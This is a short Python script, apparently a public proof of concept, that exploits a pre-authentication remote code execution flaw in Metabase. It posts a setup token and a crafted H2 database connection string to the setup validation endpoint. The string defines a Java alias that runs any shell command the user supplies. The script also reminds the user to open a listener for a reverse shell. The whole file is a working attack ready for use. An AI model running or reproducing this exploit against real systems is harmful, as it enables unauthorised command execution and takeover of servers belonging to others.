import requests
import argparse

parser = argparse.ArgumentParser('Metabase Pre-Auth RCE')

parser.add_argument('-u', '--url', type=str, required=True, help='Target URL')
parser.add_argument('-t', '--token', type=str, required=True, help='Setup-Token found in /api/session/properties')
parser.add_argument('-c', '--command', type=str, required=True, help='Command to be executed in the target host')

args = parser.parse_args()

url = f"{args.url}/api/setup/validate"

headers = {'Content-Type': 'application/json'}

command = args.command

data = {
	"token": args.token,
	"details": {
		"details": {
	        "advanced-options":"True",
			"classname": "org.h2.Driver",
			"subname": 'mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=CREATE ALIAS SHELLEXEC AS $$ void shellexec(String cmd) throws java.io.IOException {Runtime.getRuntime().exec(new String[]{"sh", "-c", cmd})\;}$$\;CALL SHELLEXEC(\'`%s`\');' % command,
			"subprotocol": "h2"
	        },
	        "engine": "postgres",
	        "name": "x"
	    }
}

print(data)

response = requests.post(url, headers=headers, json=data)

print("\nPayload sent!\n\nNOTE: Make sure to open a listener on the specifed port and address if you entered a reverse shell command.\n")
print(f"RESPONSE:\n{response.text}")